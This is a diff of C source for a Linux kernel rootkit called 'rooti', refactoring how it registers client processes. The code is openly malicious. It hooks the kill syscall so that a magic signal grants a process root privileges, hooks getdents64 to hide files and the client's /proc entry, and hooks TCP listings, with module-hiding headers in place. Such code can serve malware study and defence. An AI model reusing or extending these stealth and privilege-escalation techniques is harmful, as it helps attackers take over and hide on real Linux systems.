@@ -8,7 +8,7 @@
 #include <linux/seq_file.h>
 #include <net/sock.h>
 #include <net/tcp.h>
-#include "privilege.h"
+#include "client.h"
 #include "track.h"
 #include "mod_hiding.h"
 #include "hooking.h"
@@ -26,17 +26,8 @@ enum rooti_signals {
     ROOTI_SIG_REG = 64    // request by a usermode process to be serviced by the rootkit
 };
 
-/*
-    Represents a userspace process which was registered by the rootkit in order to get access
-    to its features such as privilege escalation, hiding of the process etc.
-*/
-struct rooti_client_proc {
-    pid_t pid;            // PID of the client
-    char name[NAME_MAX];  // PID of the client, but as a string (filename in /proc)
-};
-
 // Userspace process serviced by this rootkit
-static struct rooti_client_proc rooti_client = { .pid = 0 };
+static struct rooti_client rooti_client_proc;
 
 // List of FDs to /dev/random or /dev/urandom opened by userspace processes
 static LIST_HEAD(rooti_random_tracked_fds);
@@ -64,19 +55,6 @@ static asmlinkage long (*rooti_orig_getdents64)(const struct pt_regs *regs);
 
 static int (*rooti_orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
-/*
-    Registers a new client user process.
-*/
-static int rooti_register_client(pid_t pid)
-{
-    // Initialize client process
-    rooti_client.pid = pid;
-    sprintf(rooti_client.name, "%d", pid);
-
-    // Privilege escalation to root
-    return rooti_elevate_privilege();
-}
-
 static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
@@ -91,7 +69,7 @@ static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
     }
     else if (sig == ROOTI_SIG_REG) {
         // Register the new process
-        return rooti_register_client(current->pid);
+        return rooti_register_client(&rooti_client_proc);
     }
     return rooti_orig_kill(regs);
 }
@@ -290,7 +268,7 @@ static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
     while (offset < nread) {
         curr_record = (void *)kernel_buf + offset;
         // Check if the current file begins with the defined prefix, or if the filename is the PID of the process to hide
-        if ((is_proc_dir && strncmp(curr_record->d_name, rooti_client.name, NAME_MAX) == 0) ||
+        if ((is_proc_dir && strncmp(curr_record->d_name, rooti_client_proc.name, NAME_MAX) == 0) ||
             (strlen(curr_record->d_name) >= prefix_length && memcmp(curr_record->d_name, ROOTI_HIDE_PREFIX, prefix_length) == 0)) {
             // Special case where to to hide is is the first element
             if (curr_record == kernel_buf) {
